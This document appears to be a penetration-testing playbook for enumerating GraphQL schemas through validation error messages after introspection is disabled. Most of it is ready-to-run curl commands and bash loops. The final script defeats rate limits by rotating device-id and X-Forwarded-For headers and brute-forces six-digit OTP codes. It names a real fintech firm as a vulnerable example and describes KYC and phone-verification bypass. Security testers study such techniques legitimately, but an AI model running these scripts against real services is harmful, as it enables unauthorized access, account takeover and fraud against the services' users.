# GraphQL Introspection Bypass via Error Message Enumeration

## Trigger
- Target has GraphQL endpoint (`/graphql`)
- Full introspection query (`{__schema{types{name}}}`) returns HTML/403/blocked
- But `{__typename}` returns `{"data":{"__typename":"Query"}}`

## Technique

When introspection is "disabled" but the GraphQL engine still validates queries, you can enumerate the entire schema via error messages.

### Step 1: Confirm GraphQL is alive
```bash
curl -sk -X POST "https://target/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}'
# Success: {"data":{"__typename":"Query"}}
```

### Step 2: Enumerate query fields
```bash
for field in me user users accounts transactions settings config; do
  resp=$(curl -sk -X POST "https://target/graphql" -H "Content-Type: application/json" \
    -d "{\"query\":\"{${field}{id}}\"}" | head -c 100)
  if echo "$resp" | grep -q "Forbidden"; then
    echo "[EXISTS-AUTH] $field (403)"
  elif echo "$resp" | grep -q "argument"; then
    echo "[EXISTS-NEEDS-ARG] $field"
  elif ! echo "$resp" | grep -q "Cannot query field"; then
    echo "[EXISTS-???] $field: $resp"
  fi
done
```

**Key signals:**
- `"Cannot query field X on type Query"` → field does NOT exist
- `"Forbidden"` / code:403 → field EXISTS, needs auth
- `"Field X argument Y of required type Z was not provided"` → field EXISTS, needs arguments
- `"Validation Failed"` / code:400 → field EXISTS, processes without auth!

### Step 3: Enumerate mutation inputs via error messages
```bash
# Test if mutation exists
curl -sk -X POST "https://target/graphql" -H "Content-Type: application/json" \
  -d '{"query":"mutation{createUser(input:{}){id}}"}'
# If exists: "Field \"CreateUserInput.country\" of required type \"String!\" was not provided"
# If not: "Cannot query field \"createUser\" on type \"Mutation\""

# Extract field names from errors
curl -sk -X POST "https://target/graphql" -H "Content-Type: application/json" \
  -d '{"query":"mutation{createUser(input:{fakeField:\"x\"}){id}}"}'
# Response: "Field \"fakeField\" is not defined by type \"CreateUserInput\". Did you mean \"state\"?"
# The "Did you mean" suggestions reveal REAL field names!
```

### Step 4: Enumerate return type fields
```bash
# If mutation returns an object type:
curl -sk -X POST "https://target/graphql" -H "Content-Type: application/json" \
  -d '{"query":"mutation{createUser(input:{country:\"US\"}){fakeField}}"}'
# "Cannot query field \"fakeField\" on type \"User\". Did you mean \"phones\", \"plan\", or \"role\"?"
```

### Step 5: Discover enum values
```bash
curl -sk -X POST "https://target/graphql" -H "Content-Type: application/json" \
  -d '{"query":"mutation{createUser(input:{type:\"individual\"}){id}}"}'
# "Enum \"UserType\" cannot represent non-enum value: \"individual\". Did you mean the enum value \"INDIVIDUAL\"?"
```

## Auth Behavior Differential (Critical Finding Pattern)

When testing mutations, note the error response:
- **401/403 ("Forbidden")** → mutation exists but REQUIRES auth
- **400 ("Bad Request" / "Validation Failed")** → mutation PROCESSES without auth (reaches business logic!)

**Uphold (June 2026):** `verifyPhone` mutation returned 400 "Validation Failed" (not 403) — proving it processes without authentication. Combined with rate limit bypass = OTP brute-force.

## Rate Limit Bypass via Header Rotation

When GraphQL has per-device rate limiting:
```bash
# Rotate device-id header to bypass per-device limit
curl -H "device-id: unique-$(date +%s%N)-$RANDOM" ...

# Rotate X-Forwarded-For to bypass per-IP limit  
curl -H "X-Forwarded-For: $RANDOM.$RANDOM.$RANDOM.$RANDOM" ...

# Combined: unlimited requests
for i in $(seq 1 100); do
  curl -sk -X POST "https://target/graphql" \
    -H "Content-Type: application/json" \
    -H "User-Agent: AppName/1.0 (mobile)" \
    -H "device-id: brute-${RANDOM}-${i}" \
    -H "X-Forwarded-For: ${i}.${RANDOM}.${i}.${RANDOM}" \
    -d "{\"query\":\"mutation{verifyOTP(input:{id:\\\"$FLOW_ID\\\",code:\\\"$(printf '%06d' $i)\\\"})}\"}"
done
```

**Key insight:** Mobile User-Agent often resolves the device-id requirement differently than web UA. Test with app-specific UA strings found in assetlinks.json or JS bundles.

## Impact
- Full API schema disclosure bypassing introspection disable
- Unauthenticated mutation processing discovery
- OTP brute-force when rate limits are per-device/per-header (not per-session)
- On fintech platforms: KYC bypass, phone verification bypass

## Pitfalls
- `{__typename}` working does NOT mean full introspection works — test separately
- Some fields return HTML (SPA catch-all) for complex queries but JSON for simple ones — the gateway routes based on query complexity
- "Did you mean" suggestions only appear for close matches — use common field names
- Mobile UA may unlock different behavior than web UA (different rate limit resolution)
